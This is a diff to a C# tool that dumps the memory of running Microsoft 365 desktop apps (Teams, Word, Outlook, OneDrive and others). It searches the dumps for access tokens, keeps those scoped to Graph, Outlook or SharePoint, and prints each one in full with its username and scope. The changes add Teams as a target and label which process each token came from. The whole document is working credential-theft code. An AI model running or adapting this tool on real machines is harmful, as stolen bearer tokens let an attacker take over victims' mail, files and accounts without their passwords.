@@ -9,30 +9,31 @@ using System.Collections.Generic;
 using System.Text.RegularExpressions;
 using Newtonsoft.Json.Linq;
 
-class Program
+class TokenInfo
 {
-    // To hold our token info and print out at the end 
-    class TokenInfo
+    public string Audience { get; set; }
+    public string Username { get; set; }
+    public string Scope { get; set; }
+    public string FullToken { get; set; }
+    public string FromProcess { get; set; }
+
+    public TokenInfo(string audience, string username, string scope, string fullToken, string fromProcess)
     {
-        public string Audience { get; set; }
-        public string Username { get; set; }
-        public string Scope { get; set; }
-        public string FullToken { get; set; }
-
-        public TokenInfo(string audience, string username, string scope, string fullToken)
-        {
-            Audience = audience;
-            Username = username;
-            Scope = scope;
-            FullToken = fullToken;
-        }
-
-        public override string ToString()
-        {
-            return $"[*] Username:\n\t{Username}\n[*] Audience:\n\t{Audience}\n[*] Scope:\n\t{Scope}\n[*] Token:\n{FullToken}\n";
-        }
+        Audience = audience;
+        Username = username;
+        Scope = scope;
+        FullToken = fullToken;
+        FromProcess = fromProcess;
     }
 
+    public override string ToString()
+    {
+        return $"[*] Username:\n\t{Username}\n[*] From process:\n\t{FromProcess}\n[*] Audience:\n\t{Audience}\n[*] Scope:\n\t{Scope}\n[*] Token:\n{FullToken}\n";
+    }
+}
+
+class Program
+{
     // Windows API functions and constants
     [DllImport("dbghelp.dll", SetLastError = true)]
     static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId, SafeHandle hFile, int DumpType, IntPtr ExceptionParam, IntPtr UserStreamParam, IntPtr CallbackParam);
@@ -52,25 +53,17 @@ class Program
     const uint PROCESS_VM_READ = 0x0010;
     const string DumpDirectory = "dump";
 
-    // Our interesting processes
-    static readonly string[] KnownProcesses = { "WINWORD", "ONENOTE", "POWERPNT", "OUTLOOK", "EXCEL", "ONEDRIVE", "SHAREPOINT" };
-
-    // ... and our exploitable token audiences
+    static readonly string[] KnownProcesses = { "TEAMS", "WINWORD", "ONENOTE", "POWERPNT", "OUTLOOK", "EXCEL", "ONEDRIVE", "SHAREPOINT" };
     static readonly HashSet<string> KnownAudiences = new HashSet<string> { "https://graph.microsoft.com/", "https://outlook.office365.com/", "https://outlook.office.com",
                      "sharepoint.com", "00000003-0000-0000-c000-000000000000"};
-    
-    // Collect them all here for parsing
+
     static readonly HashSet<string> ExtractedTokens = new HashSet<string>();
     static readonly List<TokenInfo> ExtractedTokenInfos = new List<TokenInfo>();
     static readonly HashSet<string> AudScopeSet = new HashSet<string>();
 
-
-    // let's do this!
     static void Main(string[] args)
     {
-       
         Console.WriteLine("[*] Looking for M365 Desktop app processes...");
-
         var matchingProcesses = Process.GetProcesses()
             .Where(p => KnownProcesses.Contains(p.ProcessName.ToUpper()))
             .ToList();
@@ -78,7 +71,7 @@ class Program
         if (matchingProcesses.Count == 0)
         {
             Console.WriteLine("[-] No M365 Desktop app processes found. Exiting program.");
-            return; // Exit the program
+            return;
         }
 
         Console.WriteLine("[+] Office processes found. Starting process memory dump...");
@@ -89,18 +82,16 @@ class Program
             Directory.CreateDirectory(DumpDirectory);
         }
 
-        bool anyFilesCreated = false;
-        foreach (var process in Process.GetProcesses())
+        Dictionary<string, string> dumpFiles = new Dictionary<string, string>();
+        foreach (var process in matchingProcesses)
         {
             try
             {
-                if (KnownProcesses.Contains(process.ProcessName.ToUpper()))
+                Console.WriteLine($"[*] Dumping {process.ProcessName}");
+                string dumpFilePath = DumpProcessMemory(process.Id, process.ProcessName);
+                if (!string.IsNullOrEmpty(dumpFilePath))
                 {
-                    Console.WriteLine($"[*] Found target process: {process.ProcessName} (PID: {process.Id}). Proceeding with memory dump.");
-                    if (DumpProcessMemory(process.Id, process.ProcessName))
-                    {
-                        anyFilesCreated = true;
-                    }
+                    dumpFiles.Add(dumpFilePath, process.ProcessName);
                 }
             }
             catch (Exception ex)
@@ -109,19 +100,24 @@ class Program
             }
         }
 
-        if (!anyFilesCreated)
+        if (dumpFiles.Count == 0)
         {
             Console.WriteLine("[-] No valid dump files were created. Cleaning up and exiting program.");
         }
-
         else
         {
             Console.WriteLine("[*] Process memory dump complete.");
-
-            foreach (string dumpFile in Directory.EnumerateFiles(DumpDirectory, "*.dmp"))
+            foreach (var kvp in dumpFiles)
             {
-                Console.WriteLine($"[*] Trying to extract tokens from: {dumpFile}");
-                ParseDumpFileForTokens(dumpFile);
+                try
+                {
+                    Console.WriteLine($"[*] Parsing {kvp.Key} for tokens...");
+                    ParseDumpFileForTokens(kvp.Key, kvp.Value);
+                }
+                catch (Exception ex)
+                {
+                    Console.WriteLine($"[-] Error: {ex}");
+                }
             }
 
             Console.WriteLine("\n-------------------------Extracted Token Information:");
@@ -129,87 +125,85 @@ class Program
             {
                 Console.WriteLine(tokenInfo);
             }
-            Console.WriteLine($"\n[*] Found {ExtractedTokenInfos.Count} unique tokens with interesting audiences and permissions.");
-
+            Console.WriteLine($"\n[*] Found {ExtractedTokenInfos.Count} unique token(s) with interesting audiences and permissions.");
         }
         CleanupDumpFiles();
         Console.WriteLine("[*] Done!");
     }
 
-    static void ParseDumpFileForTokens(string filePath)
+    static void ParseDumpFileForTokens(string filePath, string processName)
     {
-        byte[] fileBytes = File.ReadAllBytes(filePath);
-        var results = Regex.Matches(Encoding.UTF8.GetString(fileBytes), "eyJ0eX[a-zA-Z0-9\\._\\-]+");
-
-        foreach (Match match in results)
+        using (FileStream fileStream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
+        using (StreamReader reader = new StreamReader(fileStream, Encoding.UTF8))
         {
-            if (match.Success)
+            string line;
+            while ((line = reader.ReadLine()) != null)
             {
-                string[] parts = match.Value.Split('.');
-                if (parts.Length >= 2)
+                var results = Regex.Matches(line, "eyJ0eX[a-zA-Z0-9\\._\\-]+");
+                foreach (Match match in results)
                 {
-                    string payloadEncoded = parts[1];
-                    int padding = 4 - payloadEncoded.Length % 4;
-                    string decodedPayload;
-
-                    try
+                    if (match.Success)
                     {
-                        decodedPayload = Encoding.UTF8.GetString(Convert.FromBase64String(payloadEncoded + new string('=', padding)));
-                        //Console.WriteLine($"[*] Decoded payload: {decodedPayload}");
-                    }
-                    catch (Exception ex)
-                    {
-                        //Console.WriteLine($"[*] Error decoding payload: {ex.Message}");
-                        continue;
-                    }
-
-                    try
-                    {
-                        JObject js = JObject.Parse(decodedPayload);
-                        string aud = js["aud"]?.ToString();
-                        string upn = js["upn"]?.ToString();
-                        string scp = js["scp"]?.ToString();
-
-                        // Create a unique key for audience and scope
-                        string audScopeKey = $"{aud}_{scp}";
-                        if (!string.IsNullOrEmpty(aud) && KnownAudiences.Contains(aud) && !AudScopeSet.Contains(audScopeKey))
+                        string[] parts = match.Value.Split('.');
+                        if (parts.Length >= 2)
                         {
-                            AudScopeSet.Add(audScopeKey);
-                            ExtractedTokenInfos.Add(new TokenInfo(aud, upn, scp, match.Value));
-                            Console.WriteLine("[+] Token matches criteria!");
+                            string payloadEncoded = parts[1];
+                            int padding = 4 - payloadEncoded.Length % 4;
+                            string decodedPayload;
+
+                            try
+                            {
+                                decodedPayload = Encoding.UTF8.GetString(Convert.FromBase64String(payloadEncoded + new string('=', padding)));
+                            }
+                            catch (Exception ex)
+                            {
+                                continue;
+                            }
+
+                            try
+                            {
+                                JObject js = JObject.Parse(decodedPayload);
+                                string aud = js["aud"]?.ToString();
+                                string upn = js["upn"]?.ToString();
+                                string scp = js["scp"]?.ToString();
+
+                                string audScopeKey = $"{aud}_{scp}";
+                                if (!string.IsNullOrEmpty(aud) && KnownAudiences.Contains(aud) && !AudScopeSet.Contains(audScopeKey))
+                                {
+                                    AudScopeSet.Add(audScopeKey);
+                                    ExtractedTokenInfos.Add(new TokenInfo(aud, upn, scp, match.Value, processName));
+                                    Console.WriteLine("[+] Token matches criteria!");
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                continue;
+                            }
                         }
-                    }
-                    catch (Exception ex)
-                    {
-                        //Console.WriteLine($"[*] Error parsing JSON: {ex.Message}");
-                        continue;
                     }
                 }
             }
         }
     }
 
-
-    static bool DumpProcessMemory(int pid, string processName)
+    static string DumpProcessMemory(int pid, string processName)
     {
-        //Console.WriteLine($"Opening process {processName} (PID: {pid})...");
         IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
         if (processHandle == IntPtr.Zero)
         {
             Console.WriteLine($"[-] Failed to open process {processName} (PID: {pid}).");
             DisplayLastErrorMessage();
-            return false;
+            return null;
         }
 
         string dumpFilePath = Path.Combine(DumpDirectory, $"{processName}_{pid}.dmp");
         using (var fs = new FileStream(dumpFilePath, FileMode.Create, FileAccess.ReadWrite, FileShare.None))
         {
-            Console.WriteLine($"[*] Creating dump file: {dumpFilePath}");
-            if (!MiniDumpWriteDump(processHandle, pid, fs.SafeFileHandle, 2 /* MiniDumpNormal */, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
+            if (!MiniDumpWriteDump(processHandle, pid, fs.SafeFileHandle, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
             {
                 Console.WriteLine($"[-] Failed to write memory dump for process {processName} (PID: {pid}).");
                 DisplayLastErrorMessage();
-                return false;
+                return null;
             }
         }
 
@@ -219,15 +213,14 @@ class Program
             DisplayLastErrorMessage();
         }
 
-        // Check if the dump file is empty
         if (new FileInfo(dumpFilePath).Length == 0)
         {
             Console.WriteLine($"[*] Dump file {dumpFilePath} is empty and will be deleted.");
             File.Delete(dumpFilePath);
-            return false;
+            return null;
         }
 
-        return true;
+        return dumpFilePath;
     }
 
     static void CleanupDumpFiles()
@@ -235,16 +228,11 @@ class Program
         try
         {
             Console.WriteLine("[*] Cleaning up dump files...");
-
-            // Delete all files in the DumpDirectory
             foreach (string file in Directory.GetFiles(DumpDirectory))
             {
                 File.Delete(file);
             }
-
-            // Delete the DumpDirectory
             Directory.Delete(DumpDirectory);
-
             Console.WriteLine("[*] Cleanup completed successfully.");
         }
         catch (Exception ex)
@@ -258,8 +246,7 @@ class Program
         uint errorCode = (uint)Marshal.GetLastWin32Error();
         StringBuilder message = new StringBuilder(1024);
         FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, IntPtr.Zero, errorCode, 0, message, (uint)message.Capacity, IntPtr.Zero);
-
-        string errorMessage = message.ToString().Replace("\r", "").Replace("\n", ""); // Stripping newlines
+        string errorMessage = message.ToString().Replace("\r", "").Replace("\n", "");
         Console.WriteLine($"[-] Error {errorCode}: {errorMessage}");
 
         if (errorMessage.Contains("Only part of a ReadProcessMemory or WriteProcessMemory request was completed"))
